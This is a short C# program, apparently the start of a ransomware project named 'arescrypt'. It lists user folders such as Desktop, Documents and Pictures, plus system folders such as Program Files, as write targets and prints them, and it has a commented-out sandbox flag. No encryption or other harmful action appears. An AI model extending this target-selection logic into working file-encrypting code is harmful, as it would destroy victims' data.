using System;
using System.Collections.Generic;

namespace arescrypt
{
    class Program
    {
        public static string sessionDomain = Environment.UserDomainName; // get current sessions domain
        public static string sessionUsername = Environment.UserName; // get current sessions username
        // static bool sandBox = true; // Safemode for testing/debugging

        static void Main(string[] args)
        {
            Console.WriteLine("Hello, " + sessionUsername);

            var userSpecificDirs = new List<string> { };
            var systemSpecificDirs = new List<string> { };

            // User specific directories, administrative rights shouldn't be required in order to write to these files
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

            // System specific directories, administrative rights may be required in order to write to these files
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
            
            string[] fullFileIndex = Misc.concatList(userSpecificDirs, systemSpecificDirs);
            foreach (string file in fullFileIndex)
                Console.WriteLine(file);

            Console.Write("\nPress any key to continue . . . ");
            Console.ReadKey(); // Hang the console
        }
    }
}
